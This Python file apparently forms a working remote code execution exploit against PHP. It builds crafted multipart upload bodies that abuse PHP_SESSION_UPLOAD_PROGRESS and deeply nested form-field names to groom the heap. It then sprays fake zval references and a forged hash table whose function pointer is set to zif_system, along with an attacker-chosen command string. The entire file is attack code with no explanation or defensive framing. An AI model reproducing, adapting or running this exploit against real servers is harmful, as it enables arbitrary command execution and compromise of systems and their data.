import struct

BOUNDARY = b"C" * 10


def part(name, value=b"", filename=None, content_type=None):
    out = bytearray()
    out += b"--" + BOUNDARY + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        out += b'; filename="' + filename + b'"'
    out += b"\r\n"
    if content_type is not None:
        out += b"Content-Type: " + content_type + b"\r\n"
    out += b"\r\n" + value + b"\r\n"
    return bytes(out)


def nested_name(index, depth=64, key_pad=90):
    first = "files[R%05d%s]" % (index, "K" * key_pad)
    return first.encode() + b"[a]" * (depth - 2)


def build_a1():
    out = bytearray()
    out += part(b"PHPSESSID", b"\0")

    for index in range(860):
        mixed1 = index == 0
        mixed2 = index == 1
        if mixed1:
            content_type = b"C" * 103
        elif mixed2:
            content_type = b"C" * 231
        else:
            content_type = b"application/octet-stream"

        out += b"--" + BOUNDARY + b'\r\nContent-Disposition: form-data; name="'
        out += nested_name(index) + b'"'
        if mixed1 or mixed2:
            out += b'; filename="A"'
        else:
            out += b'; filename=""'
        out += b"\r\nContent-Type: " + content_type + b"\r\n\r\n"

    for index in range(14):
        name = ("f%04d" % index).encode().ljust(103, b"x")[:103]
        out += part(name, b"v" * 8)
    for index in range(78):
        out += part(("b%04d" % index).encode(), b"B" * 8000)
    for index in range(20):
        out += part(("u%02d" % index).encode(), b"U" * 4000)

    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * 4000)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def tagged_value(pages, page, fake_len, index):
    length = pages * 4096 - 25
    value = bytearray(b"A" * length)
    header = page * 0x1000 - 0x1018
    struct.pack_into("<I", value, header + 0x00, 0)
    struct.pack_into("<I", value, header + 0x04, 0x16)
    struct.pack_into("<Q", value, header + 0x08, 0)
    struct.pack_into("<Q", value, header + 0x10, fake_len)
    value[header + 0x18:header + 0x20] = b"/" + ("%02d" % (index % 100)).encode() + b"BBBBB"
    return bytes(value)


def build_b1():
    out = bytearray()
    out += part(b"PHPSESSID", b"a")
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")

    specs = [(511, 0x137)] * 14 + [(400, 0x137), (511, 0x137)]
    index = 0
    for pages, page in specs:
        value = tagged_value(pages, page, 0xC8000, index)
        name = (b"f%04d" % index).ljust(120, b"f")[:120]
        out += part(name, value)
        index += 1

    for _ in range(900):
        name = ("x%05d" % index).encode() + b"[a]" * 12
        out += part(name, b"v")
        index += 1

    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def build_a2():
    out = bytearray()
    out += part(b"PHPSESSID", b"a" * 32)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")

    for index in range(115):
        out += part(("%03d" % index).encode(), b"x")

    for index in range(880):
        name = ("files[R%05d]" % index).encode() + b"[a]" * 62
        out += b"--" + BOUNDARY + b'\r\nContent-Disposition: form-data; name="'
        out += name + b'"; filename=""\r\n'
        out += b"Content-Type: application/octet-stream\r\n\r\n"

    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def build_hash_table(address, zif_system, command):
    if isinstance(command, str):
        command = command.encode()
    if len(command) > 0x160 - 0x98:
        raise ValueError("Apache proof command is too long")

    value = bytearray(384)
    struct.pack_into("<II", value, 0x00, 1, 7)
    struct.pack_into("<II", value, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", value, 0x10, address + 0x20)
    struct.pack_into("<II", value, 0x18, 1, 1)
    struct.pack_into("<II", value, 0x20, 8, 0)
    struct.pack_into("<Q", value, 0x28, 0)
    struct.pack_into("<Q", value, 0x30, zif_system)

    execute_data = 0x20
    struct.pack_into("<Q", value, execute_data + 0x00, 0)
    struct.pack_into("<Q", value, execute_data + 0x08, 0)
    struct.pack_into("<Q", value, execute_data + 0x10, zif_system)
    struct.pack_into("<Q", value, execute_data + 0x18, 0)
    struct.pack_into("<Q", value, execute_data + 0x20, 0)
    struct.pack_into("<I", value, execute_data + 0x28, 0)
    struct.pack_into("<I", value, execute_data + 0x2C, 1)
    struct.pack_into("<Q", value, execute_data + 0x30, 0)
    struct.pack_into("<Q", value, execute_data + 0x38, 0)
    struct.pack_into("<I", value, execute_data + 0x40, 0)
    struct.pack_into("<Q", value, execute_data + 0x50, address + 0x80)
    struct.pack_into("<I", value, execute_data + 0x58, 6)

    struct.pack_into("<II", value, 0x80, 1, 0x106)
    struct.pack_into("<Q", value, 0x88, 0)
    struct.pack_into("<Q", value, 0x90, len(command))
    value[0x98:0x98 + len(command)] = command
    value[0x98 + len(command)] = 0
    return bytes(value)


def fake_reference(pointer):
    value = bytearray(32)
    struct.pack_into("<I", value, 0, 1)
    value[4] = 0x0A
    struct.pack_into("<Q", value, 8, pointer)
    struct.pack_into("<I", value, 16, 0x0107)
    return bytes(value)


def spray_value(pointer):
    value = bytearray(b"S" * 384)
    reference = fake_reference(pointer)
    for offset in range(8, 384 - 31, 32):
        value[offset:offset + 32] = reference
    return bytes(value)


def spray_name(prefix, index):
    return (prefix + ("%09d" % index).encode())[:10]


def build_b2(address, zif_system, command):
    spray = spray_value(address)
    table = build_hash_table(address, zif_system, command)
    out = bytearray()

    for index in range(500):
        out += part(spray_name(b"s", index), spray)
    out += part(b"ht", table)
    out += part(b"PHPSESSID", b"a" * 32)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for index in range(495):
        out += part(spray_name(b"t", index), spray)

    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)
